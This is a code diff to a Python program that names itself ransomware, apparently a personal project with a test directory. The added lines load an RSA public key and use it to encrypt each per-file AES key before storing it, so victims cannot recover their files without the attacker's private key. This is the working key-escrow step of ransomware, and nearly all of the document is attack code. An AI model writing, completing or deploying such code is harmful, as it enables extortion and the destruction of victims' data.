@@ -40,6 +40,12 @@ ransomware_path = os.path.join(home, ransomware_name)
 test_path = "/home/tarcisio/teste/"
 
 
+with open(ransomware_path + '/client_public_key.PEM', 'r') as f:
+    client_public_key = f.read()
+client_public_key_obj = RSA.importKey(client_public_key)
+
+
+
 
 def get_paths():
     
@@ -148,12 +154,19 @@ def menu():
     encrypted_files = get_paths()
     new_files = get_files.find_files(test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
-    
+
     if(aes_keys_and_base64_path != None):
         with open(ransomware_path + '/AES_encrypted_keys.txt', 'a') as f:    
             for _ in aes_keys_and_base64_path:
-                f.write(base64.b64encode(_[0]) + " " + _[1] + "\n")
+                
+                # encrypt aes key
+                cipher = PKCS1_OAEP.new(client_public_key_obj)
+                encrypted_aes_key = cipher.encrypt(_[0])
+                
+                # store to disk encrypted aes key and path
+                f.write(base64.b64encode(encrypted_aes_key) + " " + _[1] + "\n")
 
+        # free the memory
         aes_keys_and_base64_path = None
         gc.collect()
         del aes_keys_and_base64_path
